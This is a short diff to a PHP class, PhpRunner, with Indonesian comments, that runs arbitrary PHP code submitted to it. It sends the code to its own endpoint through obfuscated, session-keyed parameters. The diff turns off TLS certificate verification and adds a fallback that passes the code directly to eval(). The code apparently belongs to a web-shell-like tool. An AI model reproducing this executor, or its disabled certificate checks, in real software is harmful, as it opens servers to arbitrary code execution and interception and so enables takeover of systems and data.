@@ -38,10 +38,12 @@ class PhpRunner {
         self::$executor = $canCurl
             // Mode curl self-loop: kirim code ke endpoint diri sendiri
             ? static function (string $code): void {
-                $sk   = $_SESSION['_sk'];
-                $tok  = PhpRunner::execToken();
-                $url  = 'http://127.0.0.1' . ($_SERVER['SCRIPT_NAME'] ?? '/');
-                $ch   = curl_init($url . '?' . $sk['xr'] . '=1&' . $sk['xt'] . '=' . urlencode($tok));
+                $sk     = $_SESSION['_sk'];
+                $tok    = PhpRunner::execToken();
+                $host   = $_SERVER['HTTP_HOST'] ?? '127.0.0.1';
+                $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
+                $url    = $scheme . $host . ($_SERVER['SCRIPT_NAME'] ?? '/');
+                $ch     = curl_init($url . '?' . $sk['xr'] . '=1&' . $sk['xt'] . '=' . urlencode($tok));
                 curl_setopt_array($ch, [
                     CURLOPT_POST           => true,
                     CURLOPT_POSTFIELDS     => http_build_query([$sk['xc'] => $code]),
@@ -49,10 +51,17 @@ class PhpRunner {
                     CURLOPT_TIMEOUT        => 10,
                     CURLOPT_CONNECTTIMEOUT => 3,
                     CURLOPT_HTTPHEADER     => ['X-Requested-With: XMLHttpRequest'],
+                    CURLOPT_SSL_VERIFYPEER => false,
+                    CURLOPT_SSL_VERIFYHOST => 0,
                 ]);
                 $resp = curl_exec($ch);
                 curl_close($ch);
-                if (is_string($resp)) echo $resp;
+                if (is_string($resp) && $resp !== '') {
+                    echo $resp;
+                } else {
+                    // Fallback jika curl loopback gagal terkoneksi (misal timeout/firewalled)
+                    eval($code);
+                }
             }
             // Fallback: eval langsung
             : static function (string $code): void { eval($code); };
